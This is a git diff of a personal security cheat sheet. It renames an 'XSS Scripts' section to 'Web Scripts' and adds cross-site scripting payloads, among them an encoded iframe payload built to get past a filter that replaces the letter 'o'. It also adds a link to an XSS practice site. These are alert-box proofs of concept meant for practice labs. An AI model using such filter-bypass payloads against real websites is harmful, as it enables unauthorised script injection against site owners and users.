@@ -12,7 +12,7 @@ _Author: Lee Ting Ting_
 
 :gem: **[Common Commands & CLI](#sun_with_face-common-commands--cli)**
 
-:gem: **[XSS Scripts](#sun_with_face-xss-scripts)**
+:gem: **[Web Scripts](#sun_with_face-web-scripts)**
 
 :gem: **[Useful Python Libraries & Scripts](#sun_with_face-useful-python-libraries--scripts)**
 
@@ -195,15 +195,19 @@ _Author: Lee Ting Ting_
 25. **`nslookup <domain_name>`: See IP address of the domain**
 26. **`whoami`: Find out which user you are currently logged in**
     - `whoami /priv`: see all privileges information and whether each of them is enabled or not
-27. **``echo `nproc` ``: See the number of CPU cores**
+27. **`` echo `nproc`  ``: See the number of CPU cores**
 
-## :sun_with_face: XSS Scripts
-1. Popup alert: `"><iframe srcdoc="%3Csvg%2F%26%23x6f%3Bnload%3Dalert%281%29%3E"><"`
-    - `srcdoc` specifies the HTML content in iframe
-    - try to insert `<svg/onload=alert(1)>` but found that `o` will be replaced
-    - change `o` to `&#x6f;` with the `hex(ord('o'))` Python command  
-    - url encode `<svg/&#x6f;nload=alert(1)>` at [URLEncoder](https://www.urlencoder.org/)
-2. 
+## :sun_with_face: Web Scripts
+
+1. **`view-source:<your_url>`: View source code of a website**
+2. **`"><svg/onload=alert(1)>`: [XSS] Popup Alert Basic** 
+3. **`"><iframe srcdoc="%3Csvg%2F%26%23x6f%3Bnload%3Dalert%281%29%3E"><"`: [XSS] Popup Alert Advanced**
+   - `srcdoc` specifies the HTML content in iframe
+   - insert `<svg/onload=alert(1)>` but found that `o` will be replaced
+   - change `o` to `&#x6f;` with the `hex(ord('o'))` Python command
+   - url encode `<svg/&#x6f;nload=alert(1)>` at [URLEncoder](https://www.urlencoder.org/)
+4. **`<a href="your_url" target="<script>alert(1)</script>">click</a>`: [XSS] When the `name` variable is in the html content**
+   - the value of the target attribute will be stored at `window.name` or the `name` variable.
 
 ## :sun_with_face: Useful Python Libraries & Scripts
 
@@ -396,6 +400,7 @@ print(m)
 1. **[PortSwigger](https://portswigger.net/web-security/all-labs)**: Its web security lab covers topics across SQL injection, Cross-site scripting, Cross-site request forgery (CSRF), Cross-origin resource sharing (CORS), Server-side request forgery (SSRF), etc.
 2. **[OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)**: An insecure web application for you to attack! ([reference solutions](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/solutions.html))
 3. **[MITRE ATT&CK Matrix](https://attack.mitre.org/)**: A list of attack techniques based on real world observations.
+4. **[Prompt.ml](http://prompt.ml/)**: A XSS practicing website. Solutions are available [here](https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml).
 
 ## :sun_with_face: Curated GitHub Repos / Toolkits
 
